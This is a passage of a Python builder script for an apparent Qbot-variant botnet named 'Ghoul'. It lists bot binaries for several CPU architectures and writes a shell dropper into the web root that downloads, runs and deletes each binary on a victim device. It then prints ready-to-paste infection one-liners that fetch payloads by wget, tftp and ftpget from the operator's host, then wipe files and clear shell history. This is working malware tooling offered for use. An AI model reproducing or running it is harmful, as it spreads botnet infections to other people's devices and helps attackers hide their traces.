...
bot = sys.argv[1]
GHOUL= raw_input("Y/n Get Arch-")
if GHOUL.lower() == "y":
    get_arch = True
else:
    get_arch = False

compileas = ["m-i.p-s.GHOUL" , 
             "m-p.s-l.GHOUL" , 
             "s-h.4-.GHOUL",
             "x-8.6-.GHOUL",
             "a-r.m-6.GHOUL",  
...
run('echo -e "#!/bin/bash" > /var/www/html/GhOul.sh')

for i in compileas:
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/GhOul.sh')
...
print("Thanks For Using Ghoul Qbot Here is Your Payload")
print("\x1b[0mYour link: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/GhOul.sh; chmod 777 *; sh GhOul.sh; tftp -g " + ip + " -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c")
print("")
print("\x1b[0mYour link: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/GhOul.sh; chmod 777 GhOul.sh; sh GhOul.sh; tftp " + ip + " -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g " + ip + "; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf GhOul.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\x1b[0m")